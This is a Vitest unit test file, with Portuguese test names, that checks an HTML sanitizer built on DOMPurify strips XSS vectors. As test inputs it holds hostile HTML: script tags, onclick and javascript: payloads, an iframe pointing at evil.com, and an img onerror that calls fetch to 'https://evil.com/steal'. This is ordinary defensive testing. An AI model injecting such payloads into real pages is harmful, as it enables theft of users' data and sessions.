import { describe, it, expect } from 'vitest';
import { sanitizeHtml } from '../../src/core/utils/security';

describe('XSS - sanitizeHtml (DOMPurify)', () => {

    it('remove tags script maliciosas', () => {
        const input = '<script>alert(1)</script><p>texto</p>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('<script>');
        expect(result).toContain('<p>texto</p>');
    });

    it('remove atributos on* (event handlers)', () => {
        const input = '<a href="#" onclick="alert(1)">link</a>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('onclick');
    });

    it('remove javascript: em href', () => {
        const input = '<a href="javascript:alert(1)">link</a>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('javascript:');
    });

    it('permite tags seguras basica', () => {
        const input = '<strong>negrito</strong><em>italico</em><br><p>paragrafo</p>';
        const result = sanitizeHtml(input);
        expect(result).toContain('<strong>negrito</strong>');
        expect(result).toContain('<em>italico</em>');
    });

    it('remove iframe', () => {
        const input = '<iframe src="https://evil.com"></iframe>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('iframe');
    });

    it('remove img com onerror', () => {
        const input = '<img src=x onerror="fetch(\'https://evil.com/steal\')">';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('onerror');
        expect(result).not.toContain('fetch');
    });

    it('retorna string vazia para input vazio', () => {
        expect(sanitizeHtml('')).toBe('');
    });
});
